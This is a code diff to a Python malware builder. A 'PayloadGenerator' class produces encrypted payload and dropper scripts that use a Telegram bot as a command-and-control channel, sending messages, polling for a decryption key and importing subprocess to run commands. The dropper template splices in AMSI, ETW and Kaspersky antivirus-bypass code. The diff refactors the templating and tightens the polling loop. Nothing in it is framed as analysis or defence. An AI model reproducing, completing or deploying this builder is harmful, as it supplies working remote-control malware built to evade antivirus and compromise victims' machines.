@@ -18,49 +18,54 @@ class PayloadGenerator:
         self.bot_token = bot_token
         self.payload_bot_token = payload_bot_token
 
-    def generate_payload(self, command, chat_id):
+    def _prepare_payload(self, command):
         key = self.crypto.get_current_key()
         encrypted = self.crypto.encrypt_payload(command, key)
         key_id = self.crypto.generate_key_id()
         self.crypto.store_key(key_id, key)
+        return encrypted, key_id, key
 
+    def generate_payload(self, command, chat_id):
+        encrypted, key_id, key = self._prepare_payload(command)
         script = self._build_python_payload(encrypted, key_id, chat_id)
-        return script, key_id
+        return script, key_id, key
 
     def generate_dropper(self, command, chat_id):
-        encrypted, key_id = self.generate_payload(command, chat_id)
+        encrypted, key_id, key = self._prepare_payload(command)
         script = self._build_python_dropper(encrypted, key_id, chat_id)
-        return script
+        return script, key_id, key
 
     def _build_python_payload(self, encrypted, key_id, chat_id):
         safe_encrypted = repr(encrypted)
         safe_key_id = repr(key_id)
         safe_payload_token = repr(self.payload_bot_token)
+        safe_chat_id = repr(chat_id)
 
-        return f'''
+        template = r'''
 # -*- coding: utf-8 -*-
 import base64
 import json
 import sys
 import time
 import urllib.request
+import urllib.error
 import subprocess
 import platform
 import os
 
-PAYLOAD_TOKEN = {safe_payload_token}
-CHAT_ID = {chat_id}
-KEY_ID = {safe_key_id}
-ENCRYPTED = {safe_encrypted}
+PAYLOAD_TOKEN = %s
+CHAT_ID = %s
+KEY_ID = %s
+ENCRYPTED = %s
 
 def send_message(text):
     try:
-        url = f"https://api.telegram.org/bot{{PAYLOAD_TOKEN}}/sendMessage"
-        data = json.dumps({{
+        url = f"https://api.telegram.org/bot{PAYLOAD_TOKEN}/sendMessage"
+        data = json.dumps({
             "chat_id": CHAT_ID,
             "text": text
-        }}).encode()
-        req = urllib.request.Request(url, data=data, headers={{"Content-Type": "application/json"}})
+        }).encode()
+        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
         urllib.request.urlopen(req, timeout=10)
         return True
     except Exception as e:
@@ -72,18 +77,24 @@ def get_key():
         sys.stderr.write("[DEBUG] Sending /getkey_" + KEY_ID + "\\n")
         send_message("/getkey_" + KEY_ID)
 
-        api_url = f"https://api.telegram.org/bot{{PAYLOAD_TOKEN}}"
+        api_url = f"https://api.telegram.org/bot{PAYLOAD_TOKEN}"
         offset = None
 
         for attempt in range(15):
             try:
-                url = f"{{api_url}}/getUpdates?limit=10&timeout=20"
+                url = f"{api_url}/getUpdates?limit=1&timeout=0"
                 if offset is not None:
-                    url += f"&offset={{offset}}"
+                    url += f"&offset={offset}"
 
-                sys.stderr.write("[DEBUG] Poll attempt " + str(attempt) + " (waiting up to 20s)...\\n")
+                sys.stderr.write("[DEBUG] Poll attempt " + str(attempt) + " (short poll)...\n")
                 req = urllib.request.Request(url)
-                resp = urllib.request.urlopen(req, timeout=25)
+                try:
+                    resp = urllib.request.urlopen(req, timeout=10)
+                except urllib.error.HTTPError as e:
+                    if e.code == 409:
+                        time.sleep(0.5)
+                        continue
+                    raise
                 data = json.loads(resp.read().decode())
 
                 sys.stderr.write("[DEBUG] Got response\\n")
@@ -91,9 +102,9 @@ def get_key():
                 if data.get('ok'):
                     for update in data.get('result', []):
                         offset = update['update_id'] + 1
-                        msg = update.get('message', {{}})
+                        msg = update.get('message', {})
 
-                        if msg.get('chat', {{}}).get('id') == CHAT_ID:
+                        if msg.get('chat', {}).get('id') == CHAT_ID:
                             text = msg.get('text', '')
                             sys.stderr.write("[DEBUG] Found message: " + text + "\\n")
 
@@ -171,6 +182,7 @@ if __name__ == "__main__":
     except KeyboardInterrupt:
         sys.exit(0)
 '''
+        return template % (safe_payload_token, safe_chat_id, safe_key_id, safe_encrypted)
 
     def _build_python_dropper(self, encrypted, key_id, chat_id):
         amsi = self.av_bypass.get_amsi_bypass()
@@ -180,9 +192,10 @@ if __name__ == "__main__":
         safe_encrypted = repr(encrypted)
         safe_key_id = repr(key_id)
         safe_payload_token = repr(self.payload_bot_token)
+        safe_chat_id = repr(chat_id)
 
-        return f'''
-# -*- coding: utf-8 -*-
+        template = r'''
+# -*- coding: utf-8;
 {amsi}
 {etw}
 {kaspersky}
@@ -192,24 +205,25 @@ import json
 import sys
 import time
 import urllib.request
+import urllib.error
 import subprocess
 import platform
 import os
 import ctypes
 
-PAYLOAD_TOKEN = {safe_payload_token}
-CHAT_ID = {chat_id}
-KEY_ID = {safe_key_id}
-ENCRYPTED = {safe_encrypted}
+PAYLOAD_TOKEN = %s
+CHAT_ID = %s
+KEY_ID = %s
+ENCRYPTED = %s
 
 def send_message(text):
     try:
-        url = f"https://api.telegram.org/bot{{PAYLOAD_TOKEN}}/sendMessage"
-        data = json.dumps({{
+        url = f"https://api.telegram.org/bot{PAYLOAD_TOKEN}/sendMessage"
+        data = json.dumps({
             "chat_id": CHAT_ID,
             "text": text
-        }}).encode()
-        req = urllib.request.Request(url, data=data, headers={{"Content-Type": "application/json"}})
+        }).encode()
+        req = urllib.request.Request(url, data=data, headers={"Content-Type": "application/json"})
         urllib.request.urlopen(req, timeout=10)
         return True
     except Exception as e:
@@ -221,26 +235,32 @@ def get_key():
         sys.stderr.write("[DEBUG] Sending /getkey_" + KEY_ID + "\\n")
         send_message("/getkey_" + KEY_ID)
 
-        api_url = f"https://api.telegram.org/bot{{PAYLOAD_TOKEN}}"
+        api_url = f"https://api.telegram.org/bot{PAYLOAD_TOKEN}"
         offset = None
 
         for attempt in range(15):
             try:
-                url = f"{{api_url}}/getUpdates?limit=10&timeout=20"
+                url = f"{api_url}/getUpdates?limit=1&timeout=0"
                 if offset is not None:
-                    url += f"&offset={{offset}}"
+                    url += f"&offset={offset}"
 
-                sys.stderr.write("[DEBUG] Poll attempt " + str(attempt) + " (waiting up to 20s)...\\n")
+                sys.stderr.write("[DEBUG] Poll attempt " + str(attempt) + " (short poll)...\n")
                 req = urllib.request.Request(url)
-                resp = urllib.request.urlopen(req, timeout=25)
+                try:
+                    resp = urllib.request.urlopen(req, timeout=10)
+                except urllib.error.HTTPError as e:
+                    if e.code == 409:
+                        time.sleep(0.5)
+                        continue
+                    raise
                 data = json.loads(resp.read().decode())
 
                 if data.get('ok'):
                     for update in data.get('result', []):
                         offset = update['update_id'] + 1
-                        msg = update.get('message', {{}})
+                        msg = update.get('message', {})
 
-                        if msg.get('chat', {{}}).get('id') == CHAT_ID:
+                        if msg.get('chat', {}).get('id') == CHAT_ID:
                             text = msg.get('text', '')
                             sys.stderr.write("[DEBUG] Found message: " + text + "\\n")
 
@@ -320,3 +340,9 @@ if __name__ == "__main__":
     except:
         pass
 '''
+        return template.replace('{amsi}', amsi).replace('{etw}', etw).replace('{kaspersky}', kaspersky) % (
+            safe_payload_token,
+            safe_chat_id,
+            safe_key_id,
+            safe_encrypted
+        )
